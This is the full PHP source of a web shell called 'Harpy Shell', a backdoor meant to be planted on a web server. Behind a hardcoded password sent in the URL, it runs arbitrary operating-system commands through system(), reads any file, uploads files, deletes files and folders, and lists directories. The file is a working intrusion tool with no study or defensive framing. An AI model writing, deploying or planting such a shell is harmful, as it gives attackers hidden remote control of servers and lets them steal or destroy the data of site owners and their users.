<?php
// Auth
$password = "Deoxyz@111";

if (!isset($_GET['pass']) || $_GET['pass'] !== $password) {
    exit("Access denied");
}

// Change working directory
if (isset($_GET['cd'])) {
    $dir = $_GET['cd'];
    if (is_dir($dir)) {
        chdir($dir);
    }
}

// Upload file
$uploadMessage = '';
if (isset($_FILES['upload']) && $_FILES['upload']['error'] === UPLOAD_ERR_OK) {
    $uploadFile = basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadFile)) {
        $uploadMessage = "✅ File uploaded: $uploadFile";
    } else {
        $uploadMessage = "❌ File upload failed.";
    }
}

// Delete file or folder
$deleteMessage = '';
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_dir($target)) {
        rmdir($target) ? $deleteMessage = "✅ Folder deleted: $target" : $deleteMessage = "❌ Failed to delete folder: $target";
    } elseif (is_file($target)) {
        unlink($target) ? $deleteMessage = "✅ File deleted: $target" : $deleteMessage = "❌ Failed to delete file: $target";
    } else {
        $deleteMessage = "❌ File/Folder not found: $target";
    }
}

// View file content
$readContent = '';
if (isset($_GET['read']) && is_file($_GET['read'])) {
    $filename = $_GET['read'];
    $readContent = htmlspecialchars(file_get_contents($filename));
}

// Execute command
$commandOutput = '';
if (isset($_GET['x'])) {
    ob_start();
    system($_GET['x']);
    $commandOutput = htmlspecialchars(ob_get_clean());
}

// Get current directory
$currentDir = getcwd();
$files = scandir($currentDir);

// --- HTML Output ---
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Harpy Shell 🦅</title>
    <style>
        body {
            background: #1e1e1e;
            color: #dcdcdc;
            font-family: Consolas, monospace;
            padding: 20px;
        }
        input, button {
            padding: 5px;
            margin: 5px 0;
            background: #2e2e2e;
            color: #dcdcdc;
            border: 1px solid #555;
        }
        .output, pre {
            background: #111;
            padding: 10px;
            border: 1px solid #444;
            margin-top: 10px;
            white-space: pre-wrap;
            overflow-x: auto;
        }
        a { color: #4fc3f7; text-decoration: none; }
        hr { border: none; border-top: 1px solid #444; margin: 20px 0; }
    </style>
</head>
<body>

<h2>🦅 Harpy Web Shell</h2>

<p><strong>Current directory:</strong> <?php echo htmlspecialchars($currentDir); ?></p>

<!-- Change directory -->
<form method="GET">
    <input type="hidden" name="pass" value="<?php echo htmlspecialchars($password); ?>">
    Change directory: <input type="text" name="cd" placeholder="e.g., ../ or /tmp">
    <input type="submit" value="Go">
</form>

<!-- Command execution -->
<form method="GET">
    <input type="hidden" name="pass" value="<?php echo htmlspecialchars($password); ?>">
    Execute command: <input type="text" name="x" placeholder="e.g., ls -la">
    <input type="submit" value="Run">
</form>

<!-- Upload file -->
<form method="POST" enctype="multipart/form-data">
    <input type="hidden" name="pass" value="<?php echo htmlspecialchars($password); ?>">
    Upload file: <input type="file" name="upload">
    <input type="submit" value="Upload">
</form>

<!-- Messages -->
<?php if ($uploadMessage) echo "<div class='output'>$uploadMessage</div>"; ?>
<?php if ($deleteMessage) echo "<div class='output'>$deleteMessage</div>"; ?>

<!-- Command output -->
<?php if ($commandOutput): ?>
    <h3>Command Output:</h3>
    <pre><?php echo $commandOutput; ?></pre>
<?php endif; ?>

<!-- File viewer -->
<?php if ($readContent): ?>
    <h3>📄 File Content: <?php echo htmlspecialchars($_GET['read']); ?></h3>
    <pre><?php echo $readContent; ?></pre>
<?php endif; ?>

<!-- File list -->
<hr>
<h3>📂 Files in directory:</h3>
<ul>
<?php foreach ($files as $f): ?>
    <?php if ($f === '.') continue; ?>
    <li>
        <?php echo $f; ?> 
        <?php echo is_dir($f) ? "[DIR]" : ""; ?>
        |
        <a href="?pass=<?php echo $password; ?>&read=<?php echo urlencode($f); ?>">[Read]</a>
        |
        <a href="?pass=<?php echo $password; ?>&delete=<?php echo urlencode($f); ?>" onclick="return confirm('Are you sure you want to delete <?php echo $f; ?>?');">[Delete]</a>
    </li>
<?php endforeach; ?>
</ul>

</body>
</html>
